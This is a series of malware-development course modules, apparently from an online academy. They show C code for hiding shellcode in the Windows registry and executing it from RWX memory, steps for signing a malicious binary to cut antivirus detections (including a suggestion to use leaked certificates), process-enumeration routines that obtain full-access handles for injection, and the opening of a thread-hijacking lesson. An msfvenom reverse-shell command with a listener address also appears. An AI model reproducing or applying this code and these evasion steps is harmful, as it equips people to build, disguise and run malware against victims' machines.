![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-new-string-value.png)

#### Opening a Handle To The Registry Key

The??[RegOpenKeyExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)??WinAPI is used to open a handle to the specified registry key which is a prerequisite to creating, editing or deleting values under the registry key.

```c
LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey, 		// A handle to an open registry key
  [in, optional] LPCSTR lpSubKey, 	// The name of the registry subkey to be opened (REGISTRY constant)
  [in]           DWORD  ulOptions, 	// Specifies the option to apply when opening the key - Set to 0
  [in]           REGSAM samDesired, 	// Access Rights
  [out]          PHKEY  phkResult 	// A pointer to a variable that receives a handle to the opened key
);
```

The fourth parameter of the??`RegOpenKeyExA`??WinAPI defines the access rights to the registry key. Because the program needs to create a value under the registry key,??`KEY_SET_VALUE`??was selected. The full list of registry access rights can be found??[here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights).

```c
STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
```

#### Setting Registry Value

Next, the??[RegSetValueExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)??WinAPI is used which takes the opened handle from??`RegOpenKeyExA`??and creates a new value that is based on the second parameter,??`REGSTRING`. It will also write the payload to the newly created value.

```c
LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,            // A handle to an open registry key
  [in, optional] LPCSTR     lpValueName,     // The name of the value to be set (REGSTRING constant)
                 DWORD      Reserved,        // Set to 0
  [in]           DWORD      dwType,          // The type of data pointed to by the lpData parameter
  [in]           const BYTE *lpData,         // The data to be stored
  [in]           DWORD      cbData           // The size of the information pointed to by the lpData parameter, in bytes
);
```

It is also worth noting that the fourth parameter specifies the data type for the registry value. In this case, it's set to??`REG_BINARY`??since the payload is simply a list of bytes but the complete list of data types can be found??[here](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types).

```c
STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
```

#### Closing Registry Key Handle

Finally,??[RegCloseKey](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)??is used to close the handle of the registry key that was opened.

```c
LSTATUS RegCloseKey(
  [in] HKEY hKey // Handle to an open registry key to be closed
);
```

#### Writing To The Registry - Code Snippet

```c
// Registry key to read / write
#define     REGISTRY            "Control Panel"
#define     REGSTRING           "MalDevAcademy"

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

```

### Reading The Registry

Now that the payload has been written to the??`MalDevAcademy`??string under the??`Computer\HKEY_CURRENT_USER\Control Panel`??registry key, it is time to write the other implementation which will contain the decryption functionality that??`HellShell.exe`??provided.

This section will walk through the??`ReadShellcodeFromRegistry`??function (shown below). The function takes two parameters:

1. `sPayloadSize`??- The payload size to read.
    
2. `ppPayload`??- A buffer that will store the outputted payload.
    

#### Heap Allocation

The function starts by allocating memory to the size of??`sPayloadSize`??which will store the payload.

```c
pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
```

#### Read Registry Value

The??[RegGetValueA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-reggetvaluea)??function requires the registry key and value to read, which are??`REGISTRY`??and??`REGSTRING`, respectively. In the previous module, it was possible to fetch the payload from the internet in several chunks of any size, however, when working with??`RegGetValueA`??this is not possible since it does not read the bytes as a stream of data but rather all at once. All of this means that knowing the payload size is a requirement in the reading implementation.

```c
LSTATUS RegGetValueA(
  [in]                HKEY    hkey,     // A handle to an open registry key
  [in, optional]      LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
  [in, optional]      LPCSTR  lpValue,  // The name of the registry value.
  [in, optional]      DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
  [out, optional]     LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
  [out, optional]     PVOID   pvData,   // A pointer to a buffer that receives the value's data
  [in, out, optional] LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
);
```

The fourth parameter can be used to restrict the data type, however, this implementation uses??`RRF_RT_ANY`, signifying any data type. Alternatively,??`RRF_RT_REG_BINARY`??could have been used since the payload is of binary data type. Lastly, the payload is read to??`pBytes`??which was previously allocated using??`HeapAlloc`.

```c
STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
```

#### Reading Registry - Code Snippet

```c
BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

    LSTATUS     STATUS            = NULL;
    DWORD       dwBytesRead       = sPayloadSize;
    PVOID       pBytes            = NULL;


    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (pBytes == NULL){
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    if (sPayloadSize != dwBytesRead) {
        printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
        return FALSE;
    }

    *ppPayload = pBytes;

    return TRUE;
}

```

#### Executing Payload

Once the payload is read from the registry and stored inside the allocated buffer, the??`RunShellcode`??function is used to execute the payload. Note that this function was explained in earlier modules.

```c

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection   = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

```

### Writing To The Registry - Demo

Before executing the compiled code shown above, the registry key looks like this:

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-demo-1.png)

  

After running the program, a new registry string value is created with the RC4 encrypted payload.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-demo-2.png)

  

Double-clicking on??`MaldevAcademy`??will show the payload in HEX and ASCII format.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-demo-3.png)

  

### Reading The Registry - Demo

The program begins by reading the encrypted payload from the Registry.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-read-demo-1.png)

  

Next, the program will decrypt the payload.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-read-demo-2.png)

  

Finally, the decrypted payload is executed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/registry-read-demo-3.png)
# 4.0 Malware Binary Signing

### Introduction

When a user attempts to download a legitimate executable file from the internet, it is often signed by the company as a way of proving to the user that it is a trustworthy executable. Although security solutions will still scan the executable, additional scrutiny would've been placed on it had the binary been unsigned.

This module walks through the steps required to sign a malicious binary which can increase its trustworthiness. The module will be demonstrating binary signing on an executable generated via Msfvenom:??`msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o maldev.exe`

### Testing Binary Detection Rate

Before starting, the binary was uploaded to VirusTotal in order to see the detection rate before signing the binary. The detection rate is quite high with 52/71 vendors flagging the file as being malicious.

![VT-1](https://maldevacademy.s3.amazonaws.com/images/Basic/vt-1.png)

### Obtaining a Certificate

There are several ways to get a certificate:

- The most ideal way is to purchase the certificate from a trusted vendor such as??[DigiCert](https://www.digicert.com/).
    
- Another possibility is to use a self-signed certificate. Although this will not be as effective as a trusted certificate, this module will prove that it can still have an impact on detection rates.
    
- The last option would be to find valid certificates that are leaked on the internet (e.g. on Github). Ensure no laws are broken by using these leaked certificates.
    

### Generating a Certificate

This demo will use the self-signed certificate route. This requires??`openssl`??which is pre-built into Kali Linux.

To create a certificate first generate the required??`pem`??files. The tool requires information to include inside the certificate.

`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365`

![PEM-Creation](https://maldevacademy.s3.amazonaws.com/images/Basic/sign.png)

Next, generate a??`pfx`??file using the??`pem`??files. The tool will ask for a key phrase to be entered.

`openssl pkcs12 -inkey key.pem -in cert.pem -export -out sign.pfx`

![PFX-Creation](https://maldevacademy.s3.amazonaws.com/images/Basic/pfx-creation.png)

### Signing The Binary

Signing the binary requires??`signtool.exe`??which is part of Windows SDK. It can be installed??[here](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/). Once that's done, the binary can be signed using the command below.

`signtool sign /f sign.pfx /p <pfx-password> /t http://timestamp.digicert.com /fd sha256 binary.exe`

Viewing the binary's properties will now show a "Digital Signature" tab which shows the details of the certificate that was used to sign the binary. It also shows a warning that the certificate is not trusted.

![Properties](https://maldevacademy.s3.amazonaws.com/images/Basic/maldev-properties.png)

### Testing Signed Binary Detection Rate

The binary is re-uploaded to VirusTotal to check if there was an impact on the detection rate. Unsurprisingly, the number of security solutions that flagged the file dropped from 52 to 47. Initially, it may not appear as a massive drop in detection rate but it must be emphasized that no changes were made to the file besides signing it with a certificate.

![VT-2](https://maldevacademy.s3.amazonaws.com/images/Basic/vt-2.png)
# 4.1 Process Enumeration - EnumProcesses

### Introduction

One way to perform process enumeration was previously demonstrated in the process injection module that used??`CreateToolHelp32Snapshot`. This module will demonstrate another way to perform process enumeration using??`EnumProcesses`.

It's important for malware authors to be able to implement a technique within their malware in several ways to remain unpredictable in their actions.

### EnumProcesses

Start by reviewing Microsoft's documentation on??[EnumProcesses](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses). Notice that the function returns the Process IDs (PIDs) as an array, without the associated process names. The problem is that only having PIDs without the associated process names makes it difficult to identify the process from a human perspective.

The solution is to use the??[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess),??[GetModuleBaseName](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasenamew)??and??[EnumProcessModules](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules)??WinAPIs.

1. `OpenProcess`??will be used to open a handle to a PID with??`PROCESS_QUERY_INFORMATION`??and??`PROCESS_VM_READ`??access rights.

2. `EnumProcessModules`??will be used to enumerate all the modules within the opened process. This is required for step 3.

3. `GetModuleBaseName`??will determine the name of the process, given the enumerated process modules from step 2.


### EnumProcesses Advantage

Using the??`CreateToolhelp32Snapshot`??process enumeration method, a snapshot is created and a string comparison is performed to determine whether the process name matches the intended target process. The issue with that method is when there are multiple instances of a process running at different privilege levels, there's no way to differentiate them during the string comparison. For example, some??`svchost.exe`??processes run with normal user privileges whereas others run with elevated privileges. There is no way to determine the privilege level of??`svchost.exe`??during the string comparison. Therefore the only indicator as to whether it's privileged is if the??`OpenProcess`??call fails (assuming that the implementation is running with normal user privileges).

On the other hand, using the??`EnumProcesses`??process enumeration method provides the PID and handle to the process, and the objective is to obtain the process name. This method is guaranteed to be successful since a handle to the process already exists.

### Code Walkthrough

This section will explain code snippets that are based on??[Microsoft's example](https://learn.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes)??of process enumeration.

#### PrintProcesses Function

`PrintProcesses`??is a custom function that prints the process name and PID of the enumerated processes. Only processes running with the same privileges as the implementation can have their information retrieved. Information about elevated processes cannot be retrieved, again, assuming the implementation is running with normal user privileges. Attempts to open a handle to high-privileged processes using??`OpenProcess`??will result in??`ERROR_ACCESS_DENIED`??error.

It's possible to use??`OpenProcess`'s response as an indicator to determine if the process can be targeted. Processes that cannot have a handle open to them cannot be targeted whereas the ones with a handle successfully opened can be targeted.

```c
BOOL PrintProcesses() {

	DWORD		adwProcesses	[1024 * 2],
			    dwReturnLen1		= NULL,
			    dwReturnLen2		= NULL,
			    dwNmbrOfPids		= NULL;

	HANDLE		hProcess		= NULL;
	HMODULE		hModule			= NULL;

	WCHAR		szProc			[MAX_PATH];

	// Get the array of PIDs
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle 
			if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Printing the process name & its PID
						wprintf(L"[%0.3d] Process \"%s\" - Of Pid : %d \n", i, szProc, adwProcesses[i]);
					}
				}

				// Close process handle 
				CloseHandle(hProcess);
			}
		}

		// Iterate through the PIDs array  
	}

	return TRUE;
}
```

### GetRemoteProcessHandle Function

The code snippet below is an update to the previous??`PrintProcesses`??function.??`GetRemoteProcessHandle`??will perform the same tasks as??`PrintProcesses`??except it will return a handle to the specified process.

The updated function uses??`wcscmp`??to verify the target process. Furthermore,??`OpenProcess`'s access control is changed from??`PROCESS_QUERY_INFORMATION | PROCESS_VM_READ`??to??`PROCESS_ALL_ACCESS`??to provide more access to the returned process object.

```c
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	DWORD		adwProcesses	[1024 * 2],
			    dwReturnLen1		= NULL,
			    dwReturnLen2		= NULL,
			    dwNmbrOfPids		= NULL;

	HANDLE		hProcess		= NULL;
	HMODULE		hModule			= NULL;

	WCHAR		szProc			[MAX_PATH];
	
	// Get the array of PIDs
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is not NULL
		if (adwProcesses[i] != NULL) {

			// Open a process handle 
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// If EnumProcessModules succeeded
					// Get the name of 'hProcess' and save it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Perform the comparison logic
						if (wcscmp(szProcName, szProc) == 0) {
							wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							// Return by reference
							*pdwPid		= adwProcesses[i];
							*phProcess	= hProcess;
							break;	
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
```

### PrintProcesses - Example

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/enumprocesses-108501303-c0dfa0d8-5e73-431e-9f5f-3cea0bb217be.png)

### GetRemoteProcessHandle - Example

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/enumprocesses-208500959-341d233b-4852-463e-8108-6d6e4c109416.png)
# 4.2 Process Enumeration - NtQuerySystemInformation

### Introduction

This module discusses a more unique way of performing process enumeration using??`NtQuerySystemInformation`, which is a??**syscall**??(more on syscalls later).??`NtQuerySystemInformation`??is exported from the??`ntdll.dll`??module and therefore it will require the use of??`GetModuleHandle`??and??`GetProcAddress`.

[Microsoft's documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation)??on??`NtQuerySystemInformation`??shows that it is capable of returning a lot of information about the system. The focus of this module will be on using it to perform process enumeration.

### Retrieve NtQuerySystemInformation's Address

As previously mentioned,??`GetProcAddress`??and??`GetModuleHandle`??are needed to retrieve??`NtQuerySystemInformation`'s address from??`ntdll.dll`.

```c
// Function pointer
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);

fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

// Getting NtQuerySystemInformation's address
pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
if (pNtQuerySystemInformation == NULL) {
	printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
	return FALSE;
}

```

### NtQuerySystemInformation Parameters

`NtQuerySystemInformation`'s parameters are shown below.

```c
__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);
```

- `SystemInformationClass`??- Decides what type of system information the function returns.
- `SystemInformation`??- A pointer to a buffer that will receive the requested information. The returned information will be in a form of a structure of type specified according to the??`SystemInformationClass`??parameter.
- `SystemInformationLength`??- The size of the buffer pointed to by the??`SystemInformation`??parameter, in bytes.
- `ReturnLength`??- A pointer to a ULONG variable that will receive the actual size of the information written to??`SystemInformation`.

Since the objective is process enumeration, the??[SystemProcessInformation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation#systemprocessinformation)??flag will be used. Using this flag will make the function return an array of??`SYSTEM_PROCESS_INFORMATION`??structures (via the??`SystemInformation`??parameter), one for each process running in the system.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/nt-108508463-27e8a0b8-4d4e-4391-bf1d-8d75ad2567d3.png)

### SYSTEM_PROCESS_INFORMATION Structure

The next step is to review??[Microsoft's documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation#system_process_information)??to understand what the??`SYSTEM_PROCESS_INFORMATION`??structure looks like.

```c
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;
```

The focus will be on??`UNICODE_STRING ImageName`??which contains the process name and??`UniqueProcessId`??which is the process ID. Additionally,??`NextEntryOffset`??will be used to move into the next element in the returned array.

Since calling??`NtQuerySystemInformation`??with the??`SystemProcessInformation`??flag will return an array of??`SYSTEM_PROCESS_INFORMATION`??of unknown size,??`NtQuerySystemInformation`??will need to be called twice. The first call will retrieve the array size, which is used to allocate a buffer, and then the second call will use the allocated buffer.

It's expected that the first??`NtQuerySystemInformation`??call will fail with a??`STATUS_INFO_LENGTH_MISMATCH`??([0xC0000004](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55)) error since invalid parameters are being passed simply to retrieve the array size.

```c
ULONG                        uReturnLen1    = NULL,
                             uReturnLen2    = NULL;
PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
NTSTATUS                     STATUS         = NULL;

// First NtQuerySystemInformation call
// This will fail with STATUS_INFO_LENGTH_MISMATCH
// But it will provide information about how much memory to allocate (uReturnLen1)
pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
if (SystemProcInfo == NULL) {
	printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
	return FALSE;
}
 
// Second NtQuerySystemInformation call
// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
if (STATUS != 0x0) {
	printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
	return FALSE;
}
```

### Iterating Through Processes

Now that the array has been successfully retrieved, the next step is to loop through it and access??`ImageName.Buffer`, which holds the process name. Every iteration will compare the process name to the target process name.

To access each element of type??`SYSTEM_PROCESS_INFORMATION`??in the array, the??`NextEntryOffset`??member must be used. To find the address of the next element, add the address of the previous element to??`NextEntryOffset`. This is demonstrated in the snippet below.

```c
// 'SystemProcInfo' will now represent a new element in the array
SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
```

### Freeing allocated Memory

Before moving??`SystemProcInfo`??to the new element in the array, the initial address of the allocated memory needs to be saved in order to be freed later. Therefore, right before the loop begins, the address needs to be saved to a temporary variable.

```c
// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
pValueToFree = SystemProcInfo;
```

### NtQuerySystemInformation Process Enumeration

The complete code to perform process enumeration using??`NtQuerySystemInformation`??is shown below.

```c
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

	fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
	ULONG                        uReturnLen1               = NULL,
                                 uReturnLen2               = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo            = NULL;
    NTSTATUS                     STATUS                    = NULL;
	PVOID                        pValueToFree              = NULL;
	
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	while (TRUE) {

		// Check the process's name size
		// Comparing the enumerated process name to the intended target process
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			
			// Opening a handle to the target process, saving it, and then breaking 
			*pdwPid		= (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess	= OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// Move to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// Free using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

```

### Undocumented Part of NtQuerySystemInformation

`NtQuerySystemInformation`??remains largely undocumented and a large portion of it is still unknown. For example, notice the??`Reserved`??members in??`SYSTEM_PROCESS_INFORMATION`.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/nt-208666134-5c070d23-50f4-4e1d-978f-11122892a9c3.png)

The code provided in this module uses a different version of the??`SYSTEM_PROCESS_INFORMATION`??structure. Regardless, both Microsoft's version and the version used in the module's code lead to the same output. The main difference is the structure that's used in this module contains more information rather than Microsoft's limited version which contains several??`Reserved`??members. Furthermore, another version of the??`SYSTEM_INFORMATION_CLASS`??structure was used which is also more documented than Microsoft's version. Both structures can be viewed via the links below.

- `SYSTEM_PROCESS_INFORMATION`??from??[ReactOS Documentation](https://doxygen.reactos.org/da/df4/struct__SYSTEM__PROCESS__INFORMATION.html)
    
- `SYSTEM_INFORMATION_CLASS`??from??[System Informer Documentation](https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntexapi.h#L1345)
    

### Demo

The image below shows the output after compiling and running the code presented in this module. The target process is??`notepad.exe`??(on Windows 10) and??`Notepad.exe`??(on Windows 11).

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/nt-308665154-9c8bdf73-bfb4-40b5-a39f-3b6ee2044076.png)
# 4.3 Thread Hijacking - Local Thread Creation

### Introduction

[Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)??is a technique that can execute a payload without the need of creating a new thread. The way this technique works is by suspending the thread and updating the register that points to the next instruction in memory to point to the start of the payload. When the thread resumes execution, the payload is executed.

This module will use the Msfvenom TCP reverse shell payload rather than the calc payload. The reverse shell payload is used because it keeps the thread running after execution whereas the calc payload would terminate the thread after execution. Regardless, both payloads work but having the thread still running after execution allows for further analysis.

### Thread Context

Before the technique can be explained,??_thread context_??must be understood. Every thread has a scheduling priority and maintains a set of structures that the system saves to the thread's context. Thread context includes all the information the thread needs to seamlessly resume execution, including the thread's set of CPU registers and stack.

[GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)??and??[SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)??are two WinAPIs that can be used to retrieve and set a thread's context, respectively.

`GetThreadContext`??populates a??[CONTEXT](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)??structure that contains all the information about the thread. Whereas,??`SetThreadContext`??takes a populated??`CONTEXT`??structure and sets it to the specified thread.

These two WinAPIs will play a crucial role in thread hijacking and therefore it would be beneficial to review the WinAPIs and their associated parameters.

### Thread Hijacking vs Thread Creation

The first question that needs to be addressed is why hijack a created thread to execute a payload instead of executing the payload using a newly created thread.

